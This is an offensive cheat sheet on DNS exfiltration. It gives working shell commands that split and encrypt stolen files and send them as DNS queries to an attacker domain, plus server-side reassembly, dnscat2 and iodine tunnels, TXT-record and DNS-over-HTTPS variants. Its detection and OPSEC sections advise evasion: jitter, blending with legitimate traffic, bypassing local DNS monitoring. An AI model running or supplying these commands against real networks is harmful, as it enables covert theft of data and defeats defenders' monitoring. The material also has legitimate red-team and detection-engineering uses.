# DNS Exfiltration (T1048.003)

## Overview
DNS exfiltration encodes stolen data within DNS queries sent to an attacker-controlled
authoritative nameserver. Because DNS is almost universally allowed through firewalls,
it provides a reliable covert channel even in heavily restricted environments.

## How It Works
1. Attacker registers a domain (e.g., `exfil.attacker.com`) and configures an authoritative NS
2. Data on target is hex/base64 encoded and split into chunks fitting DNS label limits (63 chars per label, 253 total)
3. Each chunk becomes a subdomain query: `<encoded_chunk>.exfil.attacker.com`
4. DNS resolver forwards query to attacker's NS, which logs the subdomain data
5. Attacker reassembles chunks in order to reconstruct the original file

## DNS Label Constraints
- Maximum label length: 63 characters
- Maximum total FQDN: 253 characters
- Safe payload per query: ~180 bytes (using multiple labels)
- Allowed characters: a-z, 0-9, hyphen (use hex encoding)

## Manual DNS Exfiltration
```bash
# Step 1: Encrypt and hex-encode the data
openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.enc -k "$KEY"
xxd -p secret.enc > secret.hex

# Step 2: Split into DNS-safe chunks (60 chars per chunk)
fold -w 60 secret.hex > chunks.txt

# Step 3: Send each chunk as a DNS query
SEQ=0
while read -r line; do
    nslookup "${SEQ}.${line}.exfil.attacker.com" >/dev/null 2>&1
    SEQ=$((SEQ + 1))
    sleep $((RANDOM % 5 + 1))  # random delay 1-5 seconds
done < chunks.txt

# Step 4: Signal completion
nslookup "done.${SEQ}.exfil.attacker.com" >/dev/null 2>&1
```

## Server-Side Collection
```bash
# Using tcpdump to capture DNS queries on attacker NS
tcpdump -i eth0 -n port 53 -l | grep "exfil.attacker.com" | \
    awk '{print $8}' | sed 's/.exfil.attacker.com//' >> received.hex

# Using dnschef as fake DNS server
dnschef --fakeip 127.0.0.1 --logfile dns_exfil.log -i 0.0.0.0

# Reassemble data
sort -t. -k1 -n received.hex | cut -d. -f2 | tr -d '\n' | xxd -p -r > received.enc
openssl enc -aes-256-cbc -d -pbkdf2 -in received.enc -out recovered.txt -k "$KEY"
```

## Using dnscat2
```bash
# Server (attacker)
ruby dnscat2.rb exfil.attacker.com --secret=shared_key --no-cache

# Client (target)
./dnscat --dns "domain=exfil.attacker.com" --secret=shared_key

# Inside dnscat2 session — upload file
> upload /path/to/secret.txt /tmp/loot.txt
```

## DNS TXT Record Exfiltration
```bash
# Encode data in TXT record queries (larger payload per query)
DATA=$(base64 -w 0 secret.enc)
for i in $(seq 0 200 ${#DATA}); do
    CHUNK="${DATA:$i:200}"
    dig TXT "${i}.${CHUNK}.txt.attacker.com" +short >/dev/null 2>&1
    sleep 2
done
```

## DNS Over HTTPS (DoH) Exfiltration
```bash
# Use DoH to bypass DNS monitoring on the local network
curl -s -H "accept: application/dns-json" \
    "https://1.1.1.1/dns-query?name=${CHUNK}.exfil.attacker.com&type=A"

# Or using Google's DoH endpoint
curl -s "https://dns.google/resolve?name=${CHUNK}.exfil.attacker.com&type=A"
```

## Iodine DNS Tunnel
```bash
# Server (attacker) — creates tun0 with 10.0.0.1
iodined -f -c -P secret_pass 10.0.0.1 exfil.attacker.com

# Client (target) — creates tun0 with 10.0.0.2
iodine -f -P secret_pass exfil.attacker.com

# Now transfer data over the tunnel
scp -o "ProxyCommand=none" data.enc 10.0.0.1:/loot/
```

## Detection Considerations
- High volume of DNS queries to single domain is suspicious
- Long subdomain labels are anomalous
- TXT record queries in bulk are flagged by many IDS/IPS
- Use random delays (jitter) between queries
- Mix with legitimate DNS traffic
- Keep chunk sizes small to look like normal subdomain lookups
- Consider DNS over HTTPS to bypass local DNS monitoring
- Rotate between multiple exfil domains

## Throughput Estimates
| Method           | Approx Speed       | Stealth Level |
|------------------|---------------------|---------------|
| Raw DNS queries  | 1-5 KB/min          | High          |
| dnscat2          | 5-50 KB/min         | Medium        |
| Iodine tunnel    | 50-200 KB/min       | Low           |
| DNS over HTTPS   | 5-20 KB/min         | High          |

## OPSEC Notes
- Always encrypt data before DNS encoding
- Use sequence numbers to handle out-of-order delivery
- Implement retry logic for dropped queries
- Consider using multiple TLDs to distribute traffic
- Monitor target's DNS resolver logs if possible to detect own queries
